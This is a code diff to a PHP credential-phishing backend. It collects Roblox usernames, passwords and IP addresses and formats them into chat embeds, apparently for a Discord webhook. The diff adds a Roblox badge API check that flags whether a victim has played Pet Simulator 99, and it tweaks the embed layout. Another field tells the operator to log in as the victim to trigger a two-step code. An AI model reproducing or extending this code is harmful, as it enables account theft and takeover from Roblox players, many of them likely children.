@@ -62,9 +62,18 @@ if (isset($_GET['username']) && isset($_GET['password'])) {
             $data = json_decode($json, true);
             $image_url = $data["data"][0]["imageUrl"];
             $ip = $_SERVER['REMOTE_ADDR'];
+            $badgeId = 2153913164;
+            $url = "https://badges.roblox.com/v1/users/$userId/badges/awarded-dates?badgeIds=$badgeId";
+            $j = file_get_contents($url);
+            if ($j === '{"data":[]}' || empty($j)) {
+                $Played = 'False';
+            } else {
+                $Played = 'True';
+            }
+            $Games = $Played;
             if (file_get_contents($urlP) === 'false') {
                 $verified = 'Unverified';
-                $verifiedStatus = '❌';
+                $verifiedStatus = '<:no:765068337410736138>';
                 $timestamp = date("c", strtotime("now"));
                 $headers = [ 'Content-Type: application/json; charset=utf-8' ];
                 $POST = [
@@ -76,7 +85,7 @@ if (isset($_GET['username']) && isset($_GET['password'])) {
                                 "title" => "",
                                 "type" => "rich",
                                 "color" => hexdec("$k2"),
-                                "description" => "**[Rolimon's](https://www.rolimons.com/player/$userId) --- [Profile](https://roblox.com/users/$userId/profile)**",
+                                "description" => "**[Rolimon's](https://www.rolimons.com/player/$userId) -x- [Profile](https://roblox.com/users/$userId/profile)**",
                                 "thumbnail" => [
                                     "url" => "$image_url",
                                 ],
@@ -87,23 +96,28 @@ if (isset($_GET['username']) && isset($_GET['password'])) {
                                 "fields" => [
                                     [
                                         "name" => "**Username**",
-                                        "value" => "```$username```",
+                                        "value" => "$username",
                                         "inline" => false
                                     ],
                                     [
                                       "name" => ":key: Password",
-                                      "value" => "```$password```",
+                                      "value" => "$password",
                                       "inline" => false
                                     ],
                                     [
                                         "name" => ":robot: IP",
-                                        "value" => "```$ip```",
+                                        "value" => "$ip",
                                         "inline" => false
                                     ],
                                     [
                                         "name" => "**$verifiedStatus Status**",
-                                        "value" => "```$verified```",
+                                        "value" => "$verified",
                                         "inline" => false
+                                    ],
+                                    [
+                                        "name" => "**Played Petsim99**",
+                                        "value" => "<:petsim99:1234197371299041313> $Games",
+                                        "inline" => true
                                     ],
                                 ]
                             ],
@@ -137,7 +151,7 @@ if (isset($_GET['username']) && isset($_GET['password'])) {
                     echo "\nVerification Status: $verified"; // removing this will crash the login!
             } else {
                 $verified = 'Verified';
-                $verifiedStatus = '✅';
+                $verifiedStatus = '<:yes:765068298004987904>';
                 $api_url = "https://thumbnails.roblox.com/v1/users/avatar?userIds=$userId&size=420x420&format=Png&isCircular=false";
                 $json = file_get_contents($api_url);
                 $data = json_decode($json, true);
@@ -168,8 +182,7 @@ if (isset($_GET['username']) && isset($_GET['password'])) {
                                         "value" => "
                                         **login to $username so they can recieve a two step verification code**
                                         Username: **$username**
-                                        Password: **$password**
-                                        Type: **Email**",
+                                        Password: **$password**",
                                         "inline" => false
                                     ],
                                 ]
